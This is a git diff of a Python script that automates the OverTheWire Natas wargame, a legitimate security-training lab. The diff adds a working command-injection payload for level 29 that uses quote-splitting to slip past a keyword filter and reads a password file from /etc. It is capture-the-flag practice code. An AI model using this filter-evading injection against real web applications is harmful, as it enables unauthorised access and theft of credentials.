@@ -13,7 +13,6 @@ from phpserialize import serialize, phpobject
 CHAR_SET = string.ascii_letters + string.digits
 PASSWORD_LENGHT = 32
 COOKIE_LENGTH = 641
-NATAS = 34
 
 def natas0(url):
      return re.findall(r"The password for natas. is (.{32})", requests.get(url).text)[0]
@@ -288,18 +287,12 @@ def natas28(url):
     return re.findall(r"<li>natas29:(.{32})<\/li>", response.text)[0]
 
 def natas29(url):
-     pass
+    session = requests.Session()
+    payload = "|cat+%22/etc/nat%22%22as_webpass/nat%22%22as30%22|tr+%27\n%27+%27+%27"
+    response = session.get(f"{url}index.pl?file={payload}")
+    return re.findall(r"([^><{} =:\/\"\n]{32})", response.text)[1]
 
 def natas30(url):
-    pass
-
-def natas31(url):
-    pass
-
-def natas32(url):
-    pass
-
-def natas33(url):
     pass
 
 # Main functions
@@ -346,12 +339,9 @@ if __name__ == '__main__':
                  'natas27.natas.labs.overthewire.org/': natas27,
                  'natas28.natas.labs.overthewire.org/': natas28,
                  'natas29.natas.labs.overthewire.org/': natas29,
-                 'natas30.natas.labs.overthewire.org/': natas30,
-                 'natas31.natas.labs.overthewire.org/': natas31,
-                 'natas32.natas.labs.overthewire.org/': natas32,
-                 'natas33.natas.labs.overthewire.org/': natas33}
+                 'natas30.natas.labs.overthewire.org/': natas30}
 
-    for _ in range(NATAS):
+    for _ in range(len(dispenser)):
         url = next_level(username, password)        
         if requests.head(url).status_code == requests.codes.ok:
             print(f"[!] Logged into {username}: {url}")
